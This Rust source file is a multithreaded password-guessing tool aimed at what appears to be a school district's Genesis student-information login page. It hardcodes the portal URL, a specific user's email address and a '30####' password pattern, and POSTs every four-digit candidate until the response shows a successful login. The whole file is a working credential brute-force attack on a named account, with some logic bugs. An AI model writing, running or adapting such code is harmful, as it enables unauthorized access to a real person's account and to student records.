use std::io::Write;
use std::process;
use std::thread;
use std::time::Duration;
use std::time::{SystemTime, UNIX_EPOCH};
use ureq::{Agent, AgentBuilder};

static THREADS: u32 = 16;
static BASE_URL: &str = "https://parents.genesisedu.com/bernardsboe";
static USERNAME: &str = "connorslade@bernardsboe.com";
static PASSWORD: &str = "30####";

static mut running: u32 = 0;

struct Cracker {
    agent: Agent,
    instance: u32,
    end_index: u32,
    start_index: u32,
    password: String,
    username: String,
    base_url: String,
}

/// System of crackers working together
// struct System {
//   crackers: Vec<Cracker>,
//   passwords: u32,
//   passwords_checked: u32,
//   threads: u32,
// }

// impl System {
//   fn new(passwords: u32, threads: u32) -> System {
//     System {
//       crackers: Vec::new(),
//       passwords,
//       passwords_checked: 0,
//       threads,
//     }
//   }

//   fn add_cracker(&mut self, cracker: Cracker) {
//     self.crackers.push(cracker);
//   }

//   fn start(&mut self) {
//     for cracker in self.crackers {
//       thread::spawn(move || {

//     });
//   }
// }

/// 🍘
impl Cracker {
    fn new(
        instance: u32,
        end_index: u32,
        start_index: u32,
        agent: Agent,
        password: &str,
        username: &str,
        base_url: &str,
    ) -> Cracker {
        Cracker {
            agent,
            instance,
            end_index,
            start_index,
            password: password.to_string(),
            username: username.to_string(),
            base_url: base_url.to_string(),
        }
    }

    fn start(&self) {
        // Login Page
        let page: &str = &format!("{}/sis/j_security_check", BASE_URL);

        // let nums = self.password.matches('#').count();
        // for _ in 0..nums {
        //   end_pass = end_pass * 9 + 9;
        // }

        let mut i: u32 = self.start_index as u32;
        while i < self.end_index {
            let to_try: &str = &format!("30{:0width$}", i, width = 4);
            // color_print!(Color::Cyan, "[*] Trying Password {}", to_try);
            println!("[*] Trying Password {}", to_try);
            std::io::stdout().flush().expect("Error Flushing StdOut");
            // Send Username and Password attempt to server
            let body = match self
                .agent
                .post(page)
                .query("j_username", &self.username)
                .query("j_password", to_try)
                .call()
            {
                Ok(body) => body.into_string().expect("Error Reading Server Response"),
                Err(e) => continue,
            };

            i += 1;

            // If not logged in try next password
            if !body.contains("Account is inactive") && !body.contains("workStudentId") {
                continue;
            }

            color_print!(Color::Green, "\n[+] Password found: {}", to_try);
            std::process::abort();
            return;
        }
        unsafe {
            running -= 1;
        }
    }
}

pub fn crack() {
    let agent: Agent = AgentBuilder::new()
        .timeout_read(Duration::from_secs(5))
        .timeout_write(Duration::from_secs(5))
        .build();

    // Refresh Session Token
    color_print!(Color::Cyan, "[*] Refreshing Session Token");
    agent.get(&format!("{}/sis/view", BASE_URL)).call().unwrap();
    println!();

    // Start Timer
    let start_time = SystemTime::now();

    for i in 0..THREADS {
        println!("Making thread #{}", i);
        let start_index = 9999 / THREADS as u32;
        let mut end_index = start_index * (i + 1);
        if i == THREADS - 1 {
            end_index = 9999 as u32;
        }

        // println!("START: {} - END: {}", start_index * i, end_index);

        let agent = agent.clone();
        thread::spawn(move || {
            Cracker::new(
                i,
                end_index,
                start_index * i,
                agent,
                PASSWORD,
                USERNAME,
                BASE_URL,
            )
            .start();
        });
        unsafe {
            running += 1;
        }
    }

    unsafe {
        while running > 0 {
            continue;
        }
        color_print!(
            Color::Green,
            "[*] All Done - Took {}ms",
            &start_time.elapsed().unwrap().as_secs().to_string()
        );
    }
}

// Note: I now think I need to refresh the token per attempt :/